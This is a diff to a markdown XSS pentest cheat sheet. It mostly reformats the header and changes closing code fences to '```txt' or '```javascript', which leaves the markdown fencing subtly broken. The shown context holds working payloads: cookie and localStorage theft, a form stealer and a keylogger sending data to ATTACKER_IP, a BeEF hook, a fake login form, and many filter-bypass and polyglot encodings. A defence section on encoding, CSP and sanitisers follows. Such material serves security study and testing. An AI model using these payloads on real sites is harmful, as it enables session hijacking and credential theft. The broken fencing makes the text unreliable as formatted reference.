@@ -1,6 +1,10 @@
 # XSS (Cross-Site Scripting)
 
-## **Author:** Julien Bongars\*_Date:_* 2025-10-13 00:03:48**Path:** infiltration/web/xss-cross-site-scripting/main.md
+**Author:** Julien Bongars\
+**Date:** 2025-10-13 00:03:48
+**Path:** infiltration/web/xss-cross-site-scripting/main.md
+
+---
 
 ## Overview
 
@@ -32,7 +36,7 @@ Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web
 
 ```bash
 curl -I https://target.com
-```
+```txt
 
 **Online tools:**
 
@@ -64,7 +68,7 @@ nodejsscan --directory ./
 # Snyk (dependencies + code)
 snyk test
 snyk code test
-```
+```txt
 
 **Python:**
 
@@ -76,7 +80,7 @@ bandit -r . -f json -o report.json
 semgrep --config=p/xss .
 semgrep --config=p/flask .
 semgrep --config=p/django .
-```
+```txt
 
 **PHP:**
 
@@ -90,7 +94,7 @@ progpilot --file=index.php
 # Semgrep
 semgrep --config=p/xss .
 semgrep --config=p/php .
-```
+```txt
 
 **Java:**
 
@@ -101,7 +105,7 @@ spotbugs -textui -effort:max -low -html:fancy.xsl -output report.html target/
 # Semgrep
 semgrep --config=p/xss .
 semgrep --config=p/java .
-```
+```txt
 
 **Multi-Language:**
 
@@ -115,7 +119,7 @@ codeql database analyze mydb --format=sarif-latest --output=results.sarif
 
 # Semgrep (recommended - fast and accurate)
 semgrep --config=auto .
-```
+```txt
 
 ---
 
@@ -150,7 +154,7 @@ semgrep --config=auto .
   // Search in loaded scripts (limited by CORS)
   console.log("Loaded scripts:", scripts);
 })();
-```
+```txt
 
 **Test for DOM XSS sources:**
 
@@ -174,7 +178,7 @@ Object.entries(sources).forEach(([name, value]) => {
     console.log(`[!] REFLECTED: ${name} appears in page HTML`);
   }
 });
-```
+```txt
 
 **Find all event handlers:**
 
@@ -197,7 +201,7 @@ allElements.forEach(el => {
 });
 
 console.table(eventHandlers);
-```
+```txt
 
 **Monitor DOM mutations:**
 
@@ -218,7 +222,7 @@ observer.observe(document.body, {
 });
 
 console.log("[*] Monitoring DOM mutations...");
-```
+```txt
 
 **Find postMessage listeners:**
 
@@ -239,7 +243,7 @@ window.addEventListener = function(type, listener, options) {
 if (hasPostMessage) {
   window.postMessage("<img src=x onerror=alert(1)>", "*");
 }
-```
+```txt
 
 **Analyze minified code patterns:**
 
@@ -272,7 +276,7 @@ if (hasPostMessage) {
     }
   });
 })();
-```
+```txt
 
 **Check for unsafe jQuery usage:**
 
@@ -300,7 +304,7 @@ if (typeof jQuery !== "undefined") {
     };
   });
 }
-```
+```txt
 
 **Extract all URLs from page:**
 
@@ -326,7 +330,7 @@ window.fetch = function(...args) {
 };
 
 console.log("URLs found:", Array.from(urls));
-```
+```txt
 
 ---
 
@@ -339,14 +343,14 @@ console.log("URLs found:", Array.from(urls));
 <img src=x onerror=alert('XSS')>
 <svg onload=alert('XSS')>
 <body onload=alert('XSS')>
-```
+```txt
 
 ### Ping Attacker Server
 
 ```html
 <img src="http://ATTACKER_IP/ping.png" />
 <script src="http://ATTACKER_IP/script.js"></script>
-```
+```txt
 
 ### Execute Arbitrary JavaScript
 
@@ -354,7 +358,7 @@ console.log("URLs found:", Array.from(urls));
 <img src=x onerror="PAYLOAD_HERE" />
 <svg onload="PAYLOAD_HERE">
 <iframe srcdoc="<script>PAYLOAD_HERE</script>">
-```
+```txt
 
 ---
 
@@ -372,7 +376,7 @@ fetch('http://ATTACKER_IP:8080/?c='+document.cookie);
 <script>
 document.location='http://ATTACKER_IP:8080/?c='+document.cookie;
 </script>
-```
+```txt
 
 ### Steal Local Storage
 
@@ -380,7 +384,7 @@ document.location='http://ATTACKER_IP:8080/?c='+document.cookie;
 <script>
 new Image().src='http://ATTACKER_IP:8080/?data='+btoa(JSON.stringify(localStorage));
 </script>
-```
+```txt
 
 ### Steal Form Data
 
@@ -394,7 +398,7 @@ document.querySelector('form').addEventListener('submit', function(e) {
     e.target.submit();
 });
 </script>
-```
+```txt
 
 ### Keylogger
 
@@ -404,7 +408,7 @@ document.addEventListener('keypress', function(e) {
     new Image().src='http://ATTACKER_IP:8080/?key='+e.key;
 });
 </script>
-```
+```txt
 
 ### Capture Screenshots (HTML2Canvas)
 
@@ -418,7 +422,7 @@ html2canvas(document.body).then(canvas => {
     });
 });
 </script>
-```
+```txt
 
 ---
 
@@ -438,13 +442,13 @@ document.addEventListener('click', function() {
     });
 });
 </script>
-```
+```txt
 
 ### BeEF Hook (Browser Exploitation Framework)
 
 ```html
 <script src="http://ATTACKER_IP:3000/hook.js"></script>
-```
+```txt
 
 ### Create Fake Login Form
 
@@ -459,7 +463,7 @@ document.body.innerHTML = `
     </form>
 `;
 </script>
-```
+```txt
 
 ---
 
@@ -479,40 +483,40 @@ document.body.innerHTML = `
 <keygen onfocus=alert(1) autofocus>
 <video><source onerror=alert(1)>
 <audio src=x onerror=alert(1)>
-```
+```txt
 
 ### 2. Mixed Case
 
 ```html
 <ScRiPt>alert(1)</sCrIpT>
 <ImG sRc=x OnErRoR=alert(1)>
-```
+```txt
 
 ### 3. HTML Encoding
 
 ```html
 &#60;script&#62;alert(1)&#60;/script&#62;
 &lt;img src=x onerror=alert(1)&gt;
-```
+```txt
 
 ### 4. Hex Encoding
 
 ```html
 <img src=x onerror="\x61\x6c\x65\x72\x74(1)">
-```
+```txt
 
 ### 5. Unicode Encoding
 
 ```html
 <script>\u0061\u006c\u0065\u0072\u0074(1)</script>
-```
+```txt
 
 ### 6. Base64 Encoding
 
 ```html
 <img src=x onerror="eval(atob('YWxlcnQoMSk='))">
 <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
-```
+```txt
 
 ### 7. JavaScript Comments to Break Detection
 
@@ -520,7 +524,7 @@ document.body.innerHTML = `
 <script>alert(1)//</script>
 <script>alert(1)/**/</script>
 <img src=x onerror="ale/**/rt(1)">
-```
+```txt
 
 ### 8. String Concatenation
 
@@ -528,39 +532,39 @@ document.body.innerHTML = `
 <script>alert(String.fromCharCode(88,83,83))</script>
 <script>alert('X'+'S'+'S')</script>
 <script>eval('al'+'ert(1)')</script>
-```
+```txt
 
 ### 9. Template Literals
 
 ```html
 <script>alert`1`</script>
 <script>eval`alert\x281\x29`</script>
-```
+```txt
 
 ### 10. JSFuck / Character Obfuscation
 
 ```html
 <script>[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]</script>
-```
+```txt
 
 ### 11. Null Bytes
 
 ```html
 <script>alert(1)%00</script>
 <img src=x%00 onerror=alert(1)>
-```
+```txt
 
 ### 12. Double Encoding
 
 ```html
 %253Cscript%253Ealert(1)%253C/script%253E
-```
+```txt
 
 ### 13. Polyglot Payloads
 
 ```html
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
-```
+```txt
 
 ### 14. Filter Bypass with Newlines
 
@@ -568,7 +572,7 @@ javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembe
 <img src=x onerror="
 alert
 (1)">
-```
+```txt
 
 ### 15. Using Different Events
 
@@ -578,7 +582,7 @@ alert
 <input autofocus onfocus=alert(1)>
 <marquee onstart=alert(1)>
 <details open ontoggle=alert(1)>
-```
+```txt
 
 ---
 
@@ -590,33 +594,33 @@ alert
 " onclick="alert(1)
 " autofocus onfocus="alert(1)
 " onmouseover="alert(1)
-```
+```txt
 
 ### Inside JavaScript String
 
 ```javascript
 '; alert(1); //
 </script><script>alert(1)</script>
-```
+```txt
 
 ### Inside JavaScript Template Literal
 
 ```javascript
 ${alert(1)}
-```
+```txt
 
 ### Inside Event Handler
 
 ```html
 onerror=alert(1)//
 onerror='alert(1)'
-```
+```txt
 
 ### Breaking Out of HTML Comments
 
 ```html
 --><script>alert(1)</script><!--
-```
+```txt
 
 ---
 
@@ -627,20 +631,20 @@ onerror='alert(1)'
 ```javascript
 <script>eval(location.hash.slice(1))</script>;
 // URL: http://target.com/page#alert(1)
-```
+```javascript
 
 ### document.write() Sink
 
 ```javascript
 <script>document.write(location.hash.slice(1));</script>;
 // URL: http://target.com/page#<img src=x onerror=alert(1)>
-```
+```javascript
 
 ### innerHTML Sink
 
 ```javascript
 <script>element.innerHTML = location.hash.slice(1);</script>;
-```
+```txt
 
 ---
 
@@ -660,7 +664,7 @@ onerror='alert(1)'
 
 # Check if script executes
 <script>console.log('XSS executed')</script>
-```
+```txt
 
 ### Automated Scanning
 
@@ -674,7 +678,7 @@ dalfox url http://target.com/search?q=FUZZ
 # XSS Hunter
 # Use XSS Hunter payload to test blind XSS
 <script src=https://yoursubdomain.xss.ht></script>
-```
+```txt
 
 ---
 
@@ -694,7 +698,7 @@ const dangerousPatterns = /<script|javascript:|onerror=|onload=/i;
 if (dangerousPatterns.test(userInput)) {
   // Reject input
 }
-```
+```txt
 
 ### 2. Output Encoding (Context-Aware)
 
@@ -710,21 +714,21 @@ function escapeHtml(unsafe) {
     .replace(/"/g, "&quot;")
     .replace(/'/g, "&#039;");
 }
-```
+```txt
 
 **JavaScript Context:**
 
 ```javascript
 // Use JSON.stringify for JS contexts
 const safeData = JSON.stringify(userData);
-```
+```txt
 
 **URL Context:**
 
 ```javascript
 // Use encodeURIComponent
 const safeUrl = encodeURIComponent(userInput);
-```
+```txt
 
 **CSS Context:**
 
@@ -733,7 +737,7 @@ const safeUrl = encodeURIComponent(userInput);
 function escapeCSS(unsafe) {
   return unsafe.replace(/[^a-zA-Z0-9]/g, "\\$&");
 }
-```
+```txt
 
 ### 3. Content Security Policy (CSP)
 
@@ -741,7 +745,7 @@ function escapeCSS(unsafe) {
 
 ```http
 Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-RANDOM'; style-src 'self' 'nonce-RANDOM'; object-src 'none'; base-uri 'self';
-```
+```txt
 
 **Nonce-based CSP:**
 
@@ -753,13 +757,13 @@ Content-Security-Policy: script-src 'nonce-r4nd0m'
 <script nonce="r4nd0m">
     // Only scripts with matching nonce execute
 </script>
-```
+```txt
 
 **Report-Only Mode (Testing):**
 
 ```http
 Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
-```
+```txt
 
 ### 4. HTTP Headers
 
@@ -775,7 +779,7 @@ X-Frame-Options: DENY
 
 # Referrer policy
 Referrer-Policy: no-referrer
-```
+```txt
 
 ### 5. Framework-Specific Protections
 
@@ -787,7 +791,7 @@ Referrer-Policy: no-referrer
 
 // Dangerous - avoid dangerouslySetInnerHTML
 <div dangerouslySetInnerHTML={{__html: userInput}} />  // Unsafe
-```
+```txt
 
 **Vue.js:**
 
@@ -797,7 +801,7 @@ Referrer-Policy: no-referrer
 
 // Dangerous - v-html directive
 <div v-html="userInput"></div>  // Unsafe
-```
+```txt
 
 **Angular:**
 
@@ -809,7 +813,7 @@ Referrer-Policy: no-referrer
 import { DomSanitizer } from '@angular/platform-browser';
 constructor(private sanitizer: DomSanitizer) {}
 trustedHtml = this.sanitizer.sanitize(SecurityContext.HTML, userInput);
-```
+```txt
 
 ### 6. Cookie Security
 
@@ -822,7 +826,7 @@ Set-Cookie: sessionid=abc123; Secure
 
 # SameSite prevents CSRF
 Set-Cookie: sessionid=abc123; SameSite=Strict
-```
+```txt
 
 ### 7. Server-Side Sanitization Libraries
 
@@ -831,26 +835,26 @@ Set-Cookie: sessionid=abc123; SameSite=Strict
 ```javascript
 const DOMPurify = require("isomorphic-dompurify");
 const clean = DOMPurify.sanitize(dirtyInput);
-```
+```txt
 
 **Python (Bleach):**
 
 ```python
 import bleach
 clean = bleach.clean(user_input)
-```
+```txt
 
 **PHP:**
 
 ```php
 $clean = htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
-```
+```txt
 
 **Java (OWASP Java Encoder):**
 
 ```java
 String safe = Encode.forHtml(userInput);
-```
+```javascript
 
 ### 8. Defense in Depth Strategy
 
@@ -892,9 +896,11 @@ html = "<img src=\"" + userInput + "\">";
 
 // ✅ Good: Use parameterized queries/prepared statements
 // ❌ Bad: String concatenation in SQL/HTML/JS
-```
+```txt
 
 ---
+
+**Remember**: Always test for XSS on authorized systems only. Unauthorized testing is illegal.
 
 ## Resources
 
@@ -903,7 +909,7 @@ html = "<img src=\"" + userInput + "\">";
 - [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
 - [HackTricks - XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
 - [Content Security Policy Reference](https://content-security-policy.com/)
+- [securityheaders.com](https://securityheaders.com) — header check from the note
+- [Mozilla Observatory](https://observatory.mozilla.org) — header check from the note
+- [html2canvas](https://html2canvas.hertzen.com/dist/html2canvas.min.js) — screenshot script in the payload
 
----
-
-**Remember**: Always test for XSS on authorized systems only. Unauthorized testing is illegal.
